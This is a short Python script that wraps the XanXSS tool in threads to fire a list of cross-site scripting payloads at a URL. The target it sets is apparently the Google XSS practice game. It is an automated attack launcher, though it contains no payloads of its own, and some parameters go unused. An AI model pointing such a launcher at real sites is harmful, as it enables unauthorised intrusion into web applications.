import requests
from bs4 import BeautifulSoup
import logging
import threading
import os

logging.basicConfig(level=logging.INFO)


class XSSAttack:
    def __init__(self, url, time=25, checks=5, num_attacks=1, attack_type="xanxxs"):
        self.url = url
        self.time = time
        self.session = requests.Session()
        with open("XanXSS/xss-payload-list.txt", "r") as file:
            self.payloads = [line.strip() for line in file]
        self.threads = []
        self.num_attacks = num_attacks
        self.attack_type = attack_type

    def create_attacks(self):
        for _ in range(self.num_attacks):
            thread = threading.Thread(target=self.run_attack)
            self.threads.append(thread)
            thread.start()

    def run_attack(self):
        if self.attack_type == "xanxxs":
            self.xanxxs_attack()
        else:
            logging.error(f"Unknown attack type: {self.attack_type}")

    def xanxxs_attack(self):
        path_to_executable = os.path.join(os.path.dirname(__file__), "XanXSS/xanxss.py")
        command = ["python3", path_to_executable, "-u", self.url, "--payloads"]
        command.extend(self.payloads)
        command.extend(["--time", str(self.time)])
        command.extend(["-a", "1"])

        import subprocess

        subprocess.run(command)

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


# Target URL
target_url = "http://xss-game.appspot.com/level1/frame?query="

# Create and launch attack
attack = XSSAttack(target_url, time=25, checks=5, num_attacks=1, attack_type="xanxxs")
attack.create_attacks()
attack.wait_for_threads()
